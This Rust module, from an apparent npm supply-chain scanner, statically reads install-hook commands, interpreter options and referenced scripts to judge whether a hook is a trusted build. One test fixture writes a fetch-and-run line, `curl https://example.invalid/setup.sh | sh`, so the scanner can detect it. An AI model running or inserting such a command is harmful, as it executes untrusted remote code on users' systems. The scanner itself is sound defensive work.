// SPDX-License-Identifier: AGPL-3.0-only

//! Static reading of install-hook commands.
//!
//! The hook string is split into commands. A directly referenced local file is
//! read, up to one `npm run` hop and up to [`MAX_INLINE_SHELL_DEPTH`] nested
//! `sh -c` commands or command substitutions. Nothing is executed, and a bare
//! `require()` module name is not resolved.

use super::{
    HookDisposition, MAX_HOOK_CHARS, MAX_MANIFEST_BYTES, MAX_REFERENCED_SCRIPTS, structural_escape,
};
use serde_json::Value;
use std::collections::BTreeSet;
use std::fs;
use std::io;
use std::path::Path;

/// Bare command names treated as known build tools.
///
/// Strictly ascending and unique: `trusted_command` searches this slice with
/// `binary_search`. A path-form `argv[0]` is not looked up here.
const TRUSTED_COMMANDS: &[&str] = &[
    "cmake-js",
    "husky",
    "node-gyp",
    "node-gyp-build",
    "node-pre-gyp",
    "patch-package",
    "prebuild-install",
    "prebuildify",
];

/// Nested `sh -c` and command-substitution expansions followed from one hook body.
///
/// The fourth expansion is [`HookDisposition::Unverified`]. Three expansions are
/// the deepest command line this parser can spell without backslash escapes.
const MAX_INLINE_SHELL_DEPTH: u8 = 3;

pub(super) fn resolve_body(
    raw: &str,
    manifest: &Value,
    package_dir: &Path,
    canonical_root: &Path,
    warnings: &mut Vec<String>,
    shadowed: &BTreeSet<String>,
) -> (HookDisposition, String) {
    let mut budget = MAX_REFERENCED_SCRIPTS;
    let mut extra = String::new();
    let mut saw_unverified = false;
    let mut saw_other = false;
    let mut segments = 0;
    let mut walk = Walk {
        manifest,
        package_dir,
        canonical_root,
        warnings,
        budget: &mut budget,
        extra: &mut extra,
        saw_unverified: &mut saw_unverified,
        saw_other: &mut saw_other,
        segments: &mut segments,
        shadowed,
    };
    walk_script(raw, 0, &mut walk);
    let disposition = if segments == 0 {
        HookDisposition::Empty
    } else if !saw_other && !saw_unverified {
        HookDisposition::TrustedBuild
    } else if saw_unverified {
        HookDisposition::Unverified
    } else {
        HookDisposition::Inspected
    };
    (disposition, extra)
}

struct Walk<'a> {
    manifest: &'a Value,
    package_dir: &'a Path,
    canonical_root: &'a Path,
    warnings: &'a mut Vec<String>,
    budget: &'a mut usize,
    extra: &'a mut String,
    saw_unverified: &'a mut bool,
    saw_other: &'a mut bool,
    segments: &'a mut usize,
    shadowed: &'a BTreeSet<String>,
}

/// Interpreters whose entry script is read. Sorted for `binary_search`.
///
/// Shells (`bash`, `dash`, `sh`, `zsh`) also unwrap `-c`. `node`/`nodejs` follow
/// the Node.js v26.5.1 CLI. The others are the install-hook runners that show
/// up outside the Node binary: Bun, Deno, tsx, ts-node, and CPython.
const INTERPRETERS: &[&str] = &[
    "bash", "bun", "dash", "deno", "node", "nodejs", "python", "python3", "sh", "ts-node", "tsx",
    "zsh",
];

/// Node.js options that consume the next token when it is not attached with `=`.
///
/// Source: Node.js v26.5.1 Command-line API, <https://nodejs.org/api/cli.html>
/// (retrieved 2026-11-12), plus the legacy `--loader` alias documented there as
/// the previous name of `--experimental-loader`. Optional inspector values
/// (`--inspect[=[host:]port]` and the `-brk`/`-wait` forms) do not consume the
/// next token. `--experimental-config-file` accepts only the `=` form.
const NODE_VALUE_OPTIONS: &[&str] = &[
    "--build-sea",
    "--build-snapshot-config",
    "--conditions",
    "--cpu-prof-dir",
    "--cpu-prof-interval",
    "--cpu-prof-name",
    "--diagnostic-dir",
    "--disable-proto",
    "--disable-warning",
    "--dns-result-order",
    "--entry-url",
    "--env-file",
    "--env-file-if-exists",
    "--eval",
    "--experimental-loader",
    "--experimental-package-map",
    "--experimental-sea-config",
    "--experimental-test-tag-filter",
    "--heap-prof-dir",
    "--heap-prof-interval",
    "--heap-prof-name",
    "--heapsnapshot-near-heap-limit",
    "--heapsnapshot-signal",
    "--icu-data-dir",
    "--import",
    "--input-type",
    "--inspect-port",
    "--loader",
    "--localstorage-file",
    "--max-heap-size",
    "--max-http-header-size",
    "--max-old-space-size",
    "--max-old-space-size-percentage",
    "--max-semi-space-size",
    "--network-family-autoselection-attempt-timeout",
    "--openssl-config",
    "--print",
    "--redirect-warnings",
    "--report-dir",
    "--report-directory",
    "--report-filename",
    "--report-signal",
    "--require",
    "--run",
    "--secure-heap",
    "--secure-heap-min",
    "--snapshot-blob",
    "--stack-trace-limit",
    "--test-concurrency",
    "--test-coverage-branches",
    "--test-coverage-exclude",
    "--test-coverage-functions",
    "--test-coverage-include",
    "--test-coverage-lines",
    "--test-global-setup",
    "--test-isolation",
    "--test-name-pattern",
    "--test-random-seed",
    "--test-reporter",
    "--test-reporter-destination",
    "--test-rerun-failures",
    "--test-shard",
    "--test-skip-pattern",
    "--test-timeout",
    "--title",
    "--tls-cipher-list",
    "--tls-keylog",
    "--trace-event-categories",
    "--trace-event-file-pattern",
    "--trace-require-module",
    "--unhandled-rejections",
    "--use-largepages",
    "--v8-pool-size",
    "--watch-kill-signal",
    "--watch-path",
    "-C",
    "-e",
    "-p",
    "-r",
];

/// Node options whose value is executed before the entry script.
const NODE_PRELOAD_OPTIONS: &[&str] = &[
    "--experimental-loader",
    "--import",
    "--loader",
    "--require",
    "--test-global-setup",
    "-r",
];

const NODE_INLINE_OPTIONS: &[&str] = &["--eval", "--print", "-e", "-p"];

const BUN_VALUE_OPTIONS: &[&str] = &[
    "--config",
    "--cwd",
    "--define",
    "--env-file",
    "--eval",
    "--external",
    "--filter",
    "--origin",
    "--outdir",
    "--outfile",
    "--port",
    "--preload",
    "--target",
    "--tsconfig-override",
    "-e",
    "-r",
];

const BUN_PRELOAD_OPTIONS: &[&str] = &["--preload", "-r"];
const BUN_INLINE_OPTIONS: &[&str] = &["--eval", "-e"];
const BUN_SUBCOMMANDS: &[&str] = &["run"];

const DENO_VALUE_OPTIONS: &[&str] = &[
    "--cert",
    "--config",
    "--env-file",
    "--import-map",
    "--lock",
    "-c",
];

const DENO_SUBCOMMANDS: &[&str] = &["run"];
const DENO_INLINE_SUBCOMMANDS: &[&str] = &["eval"];

const TSX_VALUE_OPTIONS: &[&str] = &["--eval", "--require", "--tsconfig", "-e", "-r"];
const TSX_PRELOAD_OPTIONS: &[&str] = &["--require", "-r"];
const TSX_INLINE_OPTIONS: &[&str] = &["--eval", "-e"];
const TSX_SUBCOMMANDS: &[&str] = &["watch"];

const TS_NODE_VALUE_OPTIONS: &[&str] = &[
    "--compiler",
    "--compiler-options",
    "--eval",
    "--ignore",
    "--ignore-diagnostics",
    "--print",
    "--project",
    "--require",
    "-C",
    "-D",
    "-O",
    "-P",
    "-e",
    "-p",
    "-r",
];

const TS_NODE_PRELOAD_OPTIONS: &[&str] = &["--require", "-r"];
const TS_NODE_INLINE_OPTIONS: &[&str] = &["--eval", "--print", "-e", "-p"];

const PYTHON_VALUE_OPTIONS: &[&str] = &["--check-hash-based-pycs", "-W", "-X", "-c", "-m"];
const PYTHON_INLINE_OPTIONS: &[&str] = &["-c"];
const PYTHON_MODULE_OPTIONS: &[&str] = &["-m"];

const NO_OPTIONS: &[&str] = &[];

#[derive(Clone, Copy)]
enum Interpreter {
    Node,
    Shell,
    Bun,
    Deno,
    Tsx,
    TsNode,
    Python,
}

struct Profile {
    value_options: &'static [&'static str],
    preload_options: &'static [&'static str],
    inline_options: &'static [&'static str],
    module_options: &'static [&'static str],
    skip_subcommands: &'static [&'static str],
    inline_subcommands: &'static [&'static str],
}

#[derive(Default)]
struct Invocation {
    inline: bool,
    suppress_entry: bool,
    shell: Option<String>,
    preloads: Vec<String>,
    entry: Option<String>,
    package_script: Option<String>,
}

struct ArgCursor<'a> {
    argv: &'a [String],
    index: usize,
}

impl<'a> ArgCursor<'a> {
    fn new(argv: &'a [String]) -> Self {
        Self { argv, index: 1 }
    }

    fn peek(&self) -> Option<&'a str> {
        self.argv.get(self.index).map(String::as_str)
    }

    fn bump(&mut self) -> Option<&'a str> {
        let value = self.peek()?;
        self.index += 1;
        Some(value)
    }
}

fn walk_script(raw: &str, depth: u8, walk: &mut Walk<'_>) {
    for segment in split_segments(raw) {
        *walk.segments += 1;
        if segment.argv.is_empty() {
            continue;
        }
        let expansion = expansions(&segment.raw);
        let walked_substitution = !expansion.substitutions.is_empty();
        if let Some(reason) = expansion.opaque {
            *walk.saw_unverified = true;
            *walk.saw_other = true;
            walk.warnings
                .push(format!("skipped `{}`: {reason}", segment.raw.trim()));
        }
        for body in expansion.substitutions {
            if depth >= MAX_INLINE_SHELL_DEPTH {
                *walk.saw_unverified = true;
                walk.warnings.push(format!(
                    "skipped nested command substitution: inline shell analysis stops after {MAX_INLINE_SHELL_DEPTH} levels"
                ));
                continue;
            }
            walk_script(&body, depth + 1, walk);
        }
        if expansion.disqualify {
            *walk.saw_unverified = true;
            *walk.saw_other = true;
            walk.warnings.push(format!(
                "skipped `{}`: shell syntax is not a trusted build",
                segment.raw.trim()
            ));
        }
        if expansion.opaque.is_some() || expansion.disqualify {
            continue;
        }
        let argv = segment.argv.as_slice();
        if shell_executes_text(&argv[0]) {
            *walk.saw_unverified = true;
            *walk.saw_other = true;
            walk.warnings.push(format!(
                "command `{}` executes shell text and is not a trusted build",
                argv[0]
            ));
            let name = program_name(&argv[0]);
            if name == "eval" {
                let tail = argv[1..].join(" ");
                if !tail.is_empty() && !walked_substitution {
                    if depth >= MAX_INLINE_SHELL_DEPTH {
                        walk.warnings.push(format!(
                            "skipped nested command substitution: inline shell analysis stops after {MAX_INLINE_SHELL_DEPTH} levels"
                        ));
                    } else {
                        walk_script(&tail, depth + 1, walk);
                    }
                }
            } else if let Some(path) = argv.iter().skip(1).find(|arg| !arg.starts_with('-')) {
                read_referenced(walk, path);
            }
            continue;
        }
        if trusted_command(&argv[0], walk.shadowed) {
            continue;
        }
        *walk.saw_other = true;
        if shadowed_trusted_name(&argv[0], walk.shadowed) {
            *walk.saw_unverified = true;
            walk.warnings.push(format!(
                "command `{}` is a trusted build tool, but another package in this lockfile declares that bin name",
                program_name(&argv[0])
            ));
            continue;
        }
        if depth == 0
            && let Some(name) = npm_run_target(argv)
        {
            follow_package_script(walk, &name);
            continue;
        }
        if let Some(kind) = interpreter(&argv[0]) {
            let invocation = match kind {
                Interpreter::Shell => parse_shell(argv),
                Interpreter::Node => parse_profile(argv, node_profile()),
                Interpreter::Bun => parse_profile(argv, bun_profile()),
                Interpreter::Deno => parse_profile(argv, deno_profile()),
                Interpreter::Tsx => parse_profile(argv, tsx_profile()),
                Interpreter::TsNode => parse_profile(argv, ts_node_profile()),
                Interpreter::Python => parse_profile(argv, python_profile()),
            };
            apply_invocation(&argv[0], invocation, depth, walk);
            continue;
        }
        if !is_bare_command(&argv[0]) {
            read_referenced(walk, &argv[0]);
            continue;
        }
        *walk.saw_unverified = true;
        walk.warnings.push(format!(
            "command `{}` is not a trusted build tool, inline code, or a readable local script",
            argv[0]
        ));
    }
}

fn follow_package_script(walk: &mut Walk<'_>, name: &str) {
    match script_body(walk.manifest, name) {
        Some(body) => walk_script(body, 1, walk),
        None => *walk.saw_unverified = true,
    }
}

fn apply_invocation(argv0: &str, invocation: Invocation, depth: u8, walk: &mut Walk<'_>) {
    if let Some(command) = invocation.shell {
        if depth >= MAX_INLINE_SHELL_DEPTH {
            *walk.saw_unverified = true;
            walk.warnings.push(format!(
                "skipped nested shell command: inline shell analysis stops after {MAX_INLINE_SHELL_DEPTH} levels"
            ));
            return;
        }
        walk_script(&command, depth + 1, walk);
        return;
    }
    if depth == 0
        && let Some(name) = &invocation.package_script
    {
        follow_package_script(walk, name);
        for preload in &invocation.preloads {
            read_referenced(walk, preload);
        }
        return;
    }
    let mut read_any = false;
    for preload in &invocation.preloads {
        read_referenced(walk, preload);
        read_any = true;
    }
    if let Some(entry) = &invocation.entry {
        read_referenced(walk, entry);
        read_any = true;
    }
    if invocation.inline || read_any {
        return;
    }
    *walk.saw_unverified = true;
    walk.warnings.push(format!(
        "command `{argv0}` has no inline source and no readable local script"
    ));
}

fn read_referenced(walk: &mut Walk<'_>, rel: &str) {
    if *walk.budget == 0 {
        *walk.saw_unverified = true;
        walk.warnings.push(format!(
            "skipped `{rel}`: a hook may reference at most {MAX_REFERENCED_SCRIPTS} local scripts"
        ));
        return;
    }
    *walk.budget -= 1;
    match read_contained(walk.package_dir, walk.canonical_root, rel) {
        Ok(text) => {
            walk.extra.push_str("\n# lockward:read ");
            walk.extra.push_str(rel);
            walk.extra.push('\n');
            walk.extra.push_str(&text);
        }
        Err(reason) => {
            *walk.saw_unverified = true;
            walk.warnings.push(format!("skipped `{rel}`: {reason}"));
        }
    }
}

fn trusted_command(argv0: &str, shadowed: &BTreeSet<String>) -> bool {
    if !is_bare_command(argv0) {
        return false;
    }
    let name = program_name(argv0);
    if shadowed.contains(&name) {
        return false;
    }
    TRUSTED_COMMANDS.binary_search(&name.as_str()).is_ok()
}

fn shadowed_trusted_name(argv0: &str, shadowed: &BTreeSet<String>) -> bool {
    if !is_bare_command(argv0) {
        return false;
    }
    let name = program_name(argv0);
    shadowed.contains(&name) && TRUSTED_COMMANDS.binary_search(&name.as_str()).is_ok()
}

#[cfg(test)]
pub(super) fn trusted_command_names() -> &'static [&'static str] {
    TRUSTED_COMMANDS
}

/// A command token the shell looks up on `PATH`. A slash, backslash, or
/// drive prefix is a path and is never trusted.
fn is_bare_command(argv0: &str) -> bool {
    if argv0.contains('/') || argv0.contains('\\') {
        return false;
    }
    let mut chars = argv0.chars();
    !matches!(
        (chars.next(), chars.next()),
        (Some(letter), Some(':')) if letter.is_ascii_alphabetic()
    )
}

fn is_path_like(value: &str) -> bool {
    !is_bare_command(value) || value.starts_with('.')
}

fn interpreter(argv0: &str) -> Option<Interpreter> {
    if !is_bare_command(argv0) {
        return None;
    }
    let name = program_name(argv0);
    if INTERPRETERS.binary_search(&name.as_str()).is_err() {
        return None;
    }
    match name.as_str() {
        "node" | "nodejs" => Some(Interpreter::Node),
        "sh" | "bash" | "zsh" | "dash" => Some(Interpreter::Shell),
        "bun" => Some(Interpreter::Bun),
        "deno" => Some(Interpreter::Deno),
        "tsx" => Some(Interpreter::Tsx),
        "ts-node" => Some(Interpreter::TsNode),
        "python" | "python3" => Some(Interpreter::Python),
        _ => None,
    }
}

fn node_profile() -> Profile {
    Profile {
        value_options: NODE_VALUE_OPTIONS,
        preload_options: NODE_PRELOAD_OPTIONS,
        inline_options: NODE_INLINE_OPTIONS,
        module_options: NO_OPTIONS,
        skip_subcommands: NO_OPTIONS,
        inline_subcommands: NO_OPTIONS,
    }
}

fn bun_profile() -> Profile {
    Profile {
        value_options: BUN_VALUE_OPTIONS,
        preload_options: BUN_PRELOAD_OPTIONS,
        inline_options: BUN_INLINE_OPTIONS,
        module_options: NO_OPTIONS,
        skip_subcommands: BUN_SUBCOMMANDS,
        inline_subcommands: NO_OPTIONS,
    }
}

fn deno_profile() -> Profile {
    Profile {
        value_options: DENO_VALUE_OPTIONS,
        preload_options: NO_OPTIONS,
        inline_options: NO_OPTIONS,
        module_options: NO_OPTIONS,
        skip_subcommands: DENO_SUBCOMMANDS,
        inline_subcommands: DENO_INLINE_SUBCOMMANDS,
    }
}

fn tsx_profile() -> Profile {
    Profile {
        value_options: TSX_VALUE_OPTIONS,
        preload_options: TSX_PRELOAD_OPTIONS,
        inline_options: TSX_INLINE_OPTIONS,
        module_options: NO_OPTIONS,
        skip_subcommands: TSX_SUBCOMMANDS,
        inline_subcommands: NO_OPTIONS,
    }
}

fn ts_node_profile() -> Profile {
    Profile {
        value_options: TS_NODE_VALUE_OPTIONS,
        preload_options: TS_NODE_PRELOAD_OPTIONS,
        inline_options: TS_NODE_INLINE_OPTIONS,
        module_options: NO_OPTIONS,
        skip_subcommands: NO_OPTIONS,
        inline_subcommands: NO_OPTIONS,
    }
}

fn python_profile() -> Profile {
    Profile {
        value_options: PYTHON_VALUE_OPTIONS,
        preload_options: NO_OPTIONS,
        inline_options: PYTHON_INLINE_OPTIONS,
        module_options: PYTHON_MODULE_OPTIONS,
        skip_subcommands: NO_OPTIONS,
        inline_subcommands: NO_OPTIONS,
    }
}

fn parse_profile(argv: &[String], profile: Profile) -> Invocation {
    let mut cursor = ArgCursor::new(argv);
    let mut invocation = Invocation::default();
    let mut skipped_subcommand = false;
    loop {
        let Some(arg) = cursor.peek().map(str::to_owned) else {
            break;
        };
        if arg == "--" {
            cursor.bump();
            break;
        }
        if arg.starts_with('-') && arg != "-" {
            consume_option(&mut cursor, &profile, &mut invocation);
            continue;
        }
        if !skipped_subcommand && listed(profile.inline_subcommands, &arg) {
            invocation.inline = true;
            invocation.suppress_entry = true;
            return invocation;
        }
        if !skipped_subcommand && listed(profile.skip_subcommands, &arg) {
            skipped_subcommand = true;
            cursor.bump();
            continue;
        }
        break;
    }
    if !invocation.inline && !invocation.suppress_entry {
        invocation.entry = cursor.bump().map(str::to_owned);
    }
    invocation
}

fn consume_option(cursor: &mut ArgCursor<'_>, profile: &Profile, invocation: &mut Invocation) {
    let Some(arg) = cursor.bump().map(str::to_owned) else {
        return;
    };
    let (name, attached) = option_name_and_value(&arg);
    let name = name.to_owned();
    let value = if let Some(value) = attached {
        Some(value.to_owned())
    } else if listed(profile.value_options, &name) {
        cursor.bump().map(str::to_owned)
    } else {
        None
    };
    if listed(profile.inline_options, &name) {
        invocation.inline = true;
        invocation.suppress_entry = true;
    }
    if listed(profile.module_options, &name) {
        invocation.suppress_entry = true;
    }
    if name == "--run" {
        invocation.suppress_entry = true;
    }
    let Some(value) = value else {
        return;
    };
    if name == "--run" {
        invocation.package_script = Some(value);
    } else if listed(profile.preload_options, &name) && is_path_like(&value) {
        invocation.preloads.push(value);
    }
}

fn parse_shell(argv: &[String]) -> Invocation {
    let mut cursor = ArgCursor::new(argv);
    let mut invocation = Invocation::default();
    while let Some(arg) = cursor.peek().map(str::to_owned) {
        if arg == "--" {
            cursor.bump();
            break;
        }
        if arg == "-c" {
            cursor.bump();
            invocation.shell = Some(cursor.bump().unwrap_or("").to_owned());
            return invocation;
        }
        if is_short_cluster_with_c(&arg) {
            cursor.bump();
            invocation.shell = Some(match attached_c_operand(&arg) {
                Some(command) => command,
                None => cursor.bump().unwrap_or("").to_owned(),
            });
            return invocation;
        }
        if arg == "-o" || arg == "--rcfile" || arg == "--init-file" {
            cursor.bump();
            cursor.bump();
            continue;
        }
        if let Some((name, _)) = arg.split_once('=')
            && matches!(name, "--rcfile" | "--init-file")
        {
            cursor.bump();
            continue;
        }
        if arg.starts_with('-') && arg != "-" {
            cursor.bump();
            continue;
        }
        break;
    }
    invocation.entry = cursor.bump().map(str::to_owned);
    invocation
}

fn is_short_cluster_with_c(arg: &str) -> bool {
    let Some(body) = arg.strip_prefix('-') else {
        return false;
    };
    !body.is_empty() && !body.starts_with('-') && body.contains('c') && body.len() > 1
}

fn attached_c_operand(arg: &str) -> Option<String> {
    let body = arg.strip_prefix('-')?;
    let index = body.find('c')?;
    let rest = &body[index + 'c'.len_utf8()..];
    if rest.is_empty() {
        None
    } else {
        Some(rest.to_owned())
    }
}

fn option_name_and_value(arg: &str) -> (&str, Option<&str>) {
    if arg.starts_with('-')
        && let Some((name, value)) = arg.split_once('=')
        && name != "-"
    {
        return (name, Some(value));
    }
    (arg, None)
}

fn listed(options: &[&str], name: &str) -> bool {
    options.binary_search(&name).is_ok()
}

fn program_name(argv0: &str) -> String {
    let base = argv0.rsplit(['/', '\\']).next().unwrap_or(argv0);
    let base = base
        .strip_suffix(".cmd")
        .or_else(|| base.strip_suffix(".exe"))
        .or_else(|| base.strip_suffix(".bat"))
        .unwrap_or(base);
    base.to_ascii_lowercase()
}

fn npm_run_target(argv: &[String]) -> Option<String> {
    if !is_bare_command(&argv[0]) || program_name(&argv[0]) != "npm" {
        return None;
    }
    let mut index = 1;
    while index < argv.len() && argv[index].starts_with('-') {
        index += 1;
    }
    if index >= argv.len() || (argv[index] != "run" && argv[index] != "run-script") {
        return None;
    }
    index += 1;
    while index < argv.len() && argv[index].starts_with('-') {
        index += 1;
    }
    argv.get(index).cloned()
}

fn script_body<'a>(manifest: &'a Value, name: &str) -> Option<&'a str> {
    manifest
        .get("scripts")
        .and_then(Value::as_object)
        .and_then(|scripts| scripts.get(name))
        .and_then(Value::as_str)
}

/// Hook text may use `\` as a separator. `Path` on Unix keeps that character
/// inside one component, so the same script would name a different file there.
fn portable_relative(rel: &str) -> String {
    rel.replace('\\', "/")
}

fn read_contained(package_dir: &Path, canonical_root: &Path, rel: &str) -> Result<String, String> {
    let rel = portable_relative(rel);
    if let Some(reason) = structural_escape(&rel) {
        return Err(reason.to_owned());
    }
    let path = package_dir.join(&rel);
    let metadata = fs::symlink_metadata(&path).map_err(|err| {
        if err.kind() == io::ErrorKind::NotFound {
            "file not found".to_owned()
        } else {
            err.to_string()
        }
    })?;
    if metadata.file_type().is_symlink() {
        return Err("symlink".to_owned());
    }
    if metadata.len() > MAX_MANIFEST_BYTES {
        return Err(format!("file is {} bytes", metadata.len()));
    }
    let canonical = path.canonicalize().map_err(|err| err.to_string())?;
    if !canonical.starts_with(canonical_root) {
        return Err("resolved path leaves the project root".to_owned());
    }
    let text = fs::read_to_string(&path).map_err(|err| err.to_string())?;
    Ok(cap_script(&text))
}

fn cap_script(raw: &str) -> String {
    let mut chars = raw.chars();
    let mut kept = String::new();
    for _ in 0..MAX_HOOK_CHARS {
        match chars.next() {
            Some(ch) => kept.push(ch),
            None => return kept,
        }
    }
    if chars.next().is_some() {
        kept.push('…');
    }
    kept
}

struct CommandSegment {
    argv: Vec<String>,
    /// Original text of one command, including quotes. Separators are excluded.
    raw: String,
}

struct Expansion {
    /// Bodies of `$(...)`, backticks, process substitution, and subshells.
    substitutions: Vec<String>,
    /// Syntax this parser will not claim to understand.
    opaque: Option<&'static str>,
    /// The segment runs shell syntax even when the inner commands are trusted.
    disqualify: bool,
}

#[cfg(test)]
fn split_commands(raw: &str) -> Vec<Vec<String>> {
    split_segments(raw)
        .into_iter()
        .map(|segment| segment.argv)
        .collect()
}

fn shell_executes_text(argv0: &str) -> bool {
    if !is_bare_command(argv0) {
        return false;
    }
    matches!(program_name(argv0).as_str(), "eval" | "source" | ".")
}

fn is_simple_name(body: &str) -> bool {
    let mut chars = body.chars();
    match chars.next() {
        Some(ch) if ch == '_' || ch.is_ascii_alphabetic() => {}
        _ => return false,
    }
    chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

/// Quote-aware scan of one command. Single quotes hide their contents.
/// Double quotes still expand `$` and backticks. `$(...)` and backticks are
/// returned so the caller can walk them. Other shell syntax is either a
/// plain redirection or a reason to stop trusting the segment.
fn expansions(raw: &str) -> Expansion {
    let mut substitutions = Vec::new();
    let mut opaque = None;
    let mut disqualify = false;
    let mut chars = raw.chars().peekable();
    let mut quote: Option<char> = None;
    let note = |opaque: &mut Option<&'static str>, reason: &'static str| {
        if opaque.is_none() {
            *opaque = Some(reason);
        }
    };
    while let Some(ch) = chars.next() {
        if let Some(mark) = quote {
            if ch == mark {
                quote = None;
                continue;
            }
            if mark == '\'' {
                continue;
            }
        } else if ch == '\'' || ch == '"' {
            quote = Some(ch);
            continue;
        }
        if ch == '$' {
            match chars.peek().copied() {
                Some('(') => {
                    chars.next();
                    match take_group(&mut chars, '(', ')') {
                        Ok(body) => substitutions.push(body),
                        Err(()) => note(&mut opaque, "command substitution is not balanced"),
                    }
                }
                Some('{') => {
                    chars.next();
                    match take_group(&mut chars, '{', '}') {
                        Ok(body) if is_simple_name(&body) => {}
                        Ok(_) => note(&mut opaque, "parameter expansion is not a plain name"),
                        Err(()) => note(&mut opaque, "parameter expansion is not balanced"),
                    }
                }
                Some(name) if name == '_' || name.is_ascii_alphabetic() => {
                    chars.next();
                    while chars
                        .peek()
                        .is_some_and(|next| *next == '_' || next.is_ascii_alphanumeric())
                    {
                        chars.next();
                    }
                }
                _ => note(&mut opaque, "parameter expansion is not a plain name"),
            }
            continue;
        }
        if ch == '`' {
            let mut body = String::new();
            let mut closed = false;
            for inner in chars.by_ref() {
                if inner == '`' {
                    closed = true;
                    break;
                }
                body.push(inner);
            }
            if closed {
                substitutions.push(body);
            } else {
                note(&mut opaque, "command substitution is not balanced");
            }
            continue;
        }
        if quote.is_some() {
            continue;
        }
        if ch == '<' || ch == '>' {
            if chars.peek() == Some(&'(') {
                chars.next();
                match take_group(&mut chars, '(', ')') {
                    Ok(body) => substitutions.push(body),
                    Err(()) => note(&mut opaque, "process substitution is not balanced"),
                }
                disqualify = true;
                continue;
            }
            if ch == '<' && chars.peek() == Some(&'<') {
                chars.next();
                if chars.peek() == Some(&'-') {
                    chars.next();
                }
                note(&mut opaque, "here-document is not expanded");
                continue;
            }
            if ch == '<' {
                note(&mut opaque, "input redirection is not a trusted build");
                continue;
            }
            if chars.peek() == Some(&'&') {
                chars.next();
                let mut digits = 0;
                while chars.peek().is_some_and(|next| next.is_ascii_digit()) {
                    chars.next();
                    digits += 1;
                }
                if digits == 0 {
                    note(&mut opaque, "redirection is not a plain fd duplicate");
                }
                continue;
            }
            if chars.peek() == Some(&'>') {
                chars.next();
            }
            continue;
        }
        if ch == '(' {
            match take_group(&mut chars, '(', ')') {
                Ok(body) => substitutions.push(body),
                Err(()) => note(&mut opaque, "subshell is not balanced"),
            }
            disqualify = true;
            continue;
        }
        if ch == '{' {
            note(&mut opaque, "brace group is not expanded");
        }
    }
    if quote.is_some() {
        note(&mut opaque, "quote is not closed");
    }
    Expansion {
        substitutions,
        opaque,
        disqualify,
    }
}

fn take_group(
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
    open: char,
    close: char,
) -> Result<String, ()> {
    let mut depth = 1;
    let mut out = String::new();
    let mut quote = None;
    for ch in chars.by_ref() {
        if let Some(mark) = quote {
            out.push(ch);
            if ch == mark {
                quote = None;
            }
            continue;
        }
        if ch == '\'' || ch == '"' {
            quote = Some(ch);
            out.push(ch);
            continue;
        }
        if ch == open {
            depth += 1;
            out.push(ch);
            continue;
        }
        if ch == close {
            depth -= 1;
            if depth == 0 {
                return Ok(out);
            }
            out.push(ch);
            continue;
        }
        out.push(ch);
    }
    Err(())
}

fn split_segments(raw: &str) -> Vec<CommandSegment> {
    let mut commands = Vec::new();
    let mut current = Vec::new();
    let mut word = String::new();
    let mut segment = String::new();
    let mut chars = raw.chars().peekable();
    let mut quote: Option<char> = None;
    let flush_word = |word: &mut String, current: &mut Vec<String>| {
        if !word.is_empty() {
            current.push(std::mem::take(word));
        }
    };
    let flush_command = |word: &mut String,
                         current: &mut Vec<String>,
                         segment: &mut String,
                         commands: &mut Vec<CommandSegment>| {
        flush_word(word, current);
        if !current.is_empty() {
            commands.push(CommandSegment {
                argv: std::mem::take(current),
                raw: std::mem::take(segment),
            });
        } else {
            segment.clear();
        }
    };
    while let Some(ch) = chars.next() {
        if let Some(mark) = quote {
            segment.push(ch);
            if ch == mark {
                quote = None;
            } else {
                word.push(ch);
            }
            continue;
        }
        match ch {
            '\'' | '"' => {
                quote = Some(ch);
                segment.push(ch);
            }
            ' ' | '\t' | '\r' => {
                segment.push(ch);
                flush_word(&mut word, &mut current);
            }
            '\n' | ';' => {
                flush_command(&mut word, &mut current, &mut segment, &mut commands);
            }
            '&' | '|' => {
                if ch == '&' && chars.peek() == Some(&'>') {
                    segment.push(ch);
                    word.push(ch);
                    continue;
                }
                if ch == '&' && word.ends_with('>') {
                    segment.push(ch);
                    word.push(ch);
                    while chars.peek().is_some_and(|next| next.is_ascii_digit()) {
                        let Some(digit) = chars.next() else {
                            break;
                        };
                        segment.push(digit);
                        word.push(digit);
                    }
                    continue;
                }
                let repeated = chars.peek() == Some(&ch);
                if repeated {
                    chars.next();
                }
                flush_command(&mut word, &mut current, &mut segment, &mut commands);
            }
            _ => {
                segment.push(ch);
                word.push(ch);
            }
        }
    }
    flush_command(&mut word, &mut current, &mut segment, &mut commands);
    commands
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::path::PathBuf;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn manifest() -> Value {
        serde_json::json!({
            "scripts": { "build": "node install.js", "postinstall": "npm run build" }
        })
    }

    #[test]
    fn node_pre_gyp_install_stays_trusted_build() {
        let root = unique_dir();
        let (disposition, extra) = resolve_body(
            "node-pre-gyp install",
            &manifest(),
            &root,
            &root.canonicalize().unwrap(),
            &mut Vec::new(),
            &BTreeSet::new(),
        );
        assert_eq!(disposition, HookDisposition::TrustedBuild);
        assert!(extra.is_empty());
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn trusted_build_commands_need_no_package_name() {
        let root = unique_dir();
        let (disposition, extra) = resolve_body(
            "node-gyp rebuild && husky install",
            &manifest(),
            &root,
            &root.canonicalize().unwrap(),
            &mut Vec::new(),
            &BTreeSet::new(),
        );
        assert_eq!(disposition, HookDisposition::TrustedBuild);
        assert!(extra.is_empty());
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn referenced_script_is_read_and_escape_is_skipped() {
        let root = unique_dir();
        fs::write(
            root.join("build.js"),
            "curl https://example.invalid/setup.sh | sh\n",
        )
        .unwrap();
        let canonical = root.canonicalize().unwrap();
        let (disposition, extra) = resolve_body(
            "node build.js",
            &manifest(),
            &root,
            &canonical,
            &mut Vec::new(),
            &BTreeSet::new(),
        );
        assert_eq!(disposition, HookDisposition::Inspected);
        assert!(extra.contains("curl https://example.invalid/setup.sh | sh"));

        let mut warnings = Vec::new();
        let (blocked, _) = resolve_body(
            "node ../outside.js",
            &manifest(),
            &root,
            &canonical,
            &mut warnings,
            &BTreeSet::new(),
        );
        assert_eq!(blocked, HookDisposition::Unverified);
        assert!(!warnings.is_empty());
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn npm_run_reads_one_level() {
        let root = unique_dir();
        fs::write(
            root.join("install.js"),
            "console.log('LOCKWARD_EVAL_FIXTURE');\n",
        )
        .unwrap();
